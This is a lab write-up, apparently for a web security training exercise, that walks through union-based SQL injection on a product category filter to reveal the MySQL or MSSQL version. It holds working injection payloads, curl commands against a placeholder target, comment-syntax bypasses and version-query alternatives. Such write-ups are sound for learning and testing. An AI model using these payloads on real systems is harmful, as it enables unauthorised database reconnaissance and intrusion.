# SQL injection attack, querying the database type and version on MySQL and Microsoft — Practitioner

**Status:** Solved

---

## Goal

Determine the database version (MySQL or Microsoft SQL Server) by exploiting a SQL injection vulnerability. Display the version information on the page.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Determine the number of columns**
   - Use ORDER BY or UNION SELECT NULL:
```
   Gifts' ORDER BY 1--
   Gifts' ORDER BY 2--
   Gifts' ORDER BY 3--
```
   - Let's say it has 2 columns

3. **Find text-compatible columns**
   - Test each column for string support:
```
   Gifts' UNION SELECT 'abc',NULL--
   Gifts' UNION SELECT NULL,'abc'--
```
   - Identify which column(s) can display text

4. **Determine the database type**
   - Try MySQL comment syntax first:
```
   Gifts' UNION SELECT NULL,NULL#
```
   - If it works, likely MySQL (uses `#` for comments)
   - If not, try standard `--` (works for both)

5. **Query database version**
   - Both MySQL and MSSQL use `@@version`
   - Inject the version query:
   
   With `--` (works for both):
```
   Gifts' UNION SELECT NULL,@@version--
```
   
   With `#` (MySQL specific):
```
   Gifts' UNION SELECT NULL,@@version#
```

6. **Execute the injection**
   
   Try standard comment first:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,@@version--"
```
   
   Or MySQL style:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,@@version%23"
```
   (Note: `%23` is URL-encoded `#`)

7. **Verify the version appears**
   - Look at the page output
   - MySQL shows something like:
     - "8.0.32-0ubuntu0.20.04.2"
     - "5.7.42-log"
   - MSSQL shows something like:
     - "Microsoft SQL Server 2019 (RTM) - 15.0.2000.5"
     - "Microsoft SQL Server 2016 - 13.0.1601.5"

8. **Lab completion**
   - Lab solves automatically once version info is displayed
   - You've successfully identified the database type and version

---

## Example

- Vulnerable endpoint: `GET /filter?category=Gifts`
- Column count: 2 columns
- Column 2 accepts text
- Database: MySQL

Payload:
```bash
curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,@@version--"
```

Output on page:
```
Product: Laptop - $999
8.0.32-0ubuntu0.20.04.2
Product: Mouse - $20
```

---

## Version query alternatives

**MySQL:**
- `@@version` - Full version string
- `VERSION()` - Same as @@version
- `@@version_comment` - Additional version info
- Example output: `8.0.32-0ubuntu0.20.04.2`

**Microsoft SQL Server:**
- `@@version` - Full version with build info
- `SERVERPROPERTY('productversion')` - Version number only
- `SERVERPROPERTY('productlevel')` - Service pack level
- Example output: `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5`

---

## Comment syntax differences

| Database | Comment Syntax | URL Encoded | Notes |
|----------|---------------|-------------|-------|
| **MySQL** | `#` | `%23` | Preferred in MySQL |
| **MySQL** | `-- ` | `--+` or `--%20` | Space after `--` required |
| **MSSQL** | `--` | `--` | Standard SQL comment |
| **Both** | `/* */` | `/*%20*/` | Multi-line comment |

**Best practice:**
- Try `--` first (universal)
- If blocked, try `#` for MySQL
- Add space or `+` after `--` for safety

---

## Why this works

The `@@version` variable is a system variable available in both MySQL and Microsoft SQL Server that returns the current database version. It's accessible without special privileges and provides detailed information about the database software. By extracting this information through SQL injection, attackers can:
- Identify the exact database type
- Find known vulnerabilities for that version
- Tailor exploitation techniques
- Plan privilege escalation attacks

---

## Identifying database from version string

**MySQL version format:**
- Includes patch level: `8.0.32`
- Often includes OS: `ubuntu`, `debian`
- May include build info: `-log`, `-standard`

**MSSQL version format:**
- Always starts with "Microsoft SQL Server"
- Includes year: `2019`, `2016`, `2022`
- Shows build number: `15.0.2000.5`
- May include edition: `Enterprise`, `Express`

---

**SQLi Lab 12 Complete ✓**